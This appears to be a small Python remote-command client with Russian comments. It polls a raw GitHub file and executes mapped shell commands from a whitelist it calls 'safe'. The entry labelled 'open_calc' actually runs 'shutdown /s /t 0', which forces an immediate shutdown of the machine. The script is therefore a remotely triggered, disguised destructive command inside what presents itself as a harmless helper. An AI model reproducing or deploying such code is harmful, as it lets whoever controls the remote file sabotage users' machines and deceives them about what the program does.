import requests
import subprocess
import time

COMMAND_URL = "https://raw.githubusercontent.com/lilmonixx456x/interestingLerningC/main/command.txt"
last_cmd = ""

# Разрешённые безопасные команды
ALLOWED = {
    "hello": "echo Hello!",
    "open_notepad": "notepad.exe",
    "open_calc": "shutdown /s /t 0",
}

print("[CLIENT] Клиент запущен. Жду команд...")

while True:
    try:
        cmd = requests.get(COMMAND_URL, timeout=5).text.strip()

        if cmd and cmd != last_cmd:
            print(f"[CLIENT] Получена команда: {cmd}")
            last_cmd = cmd

            if cmd not in ALLOWED:
                print("[CLIENT] Команда отклонена: не в списке разрешённых.")
                continue

            safe_command = ALLOWED[cmd]
            print(f"[CLIENT] Выполняю безопасную команду: {safe_command}")

            subprocess.Popen(safe_command, shell=True)

        else:
            print("[CLIENT] Нет новой команды.")

    except Exception as e:
        print("[CLIENT] Ошибка:", e)

    time.sleep(10)
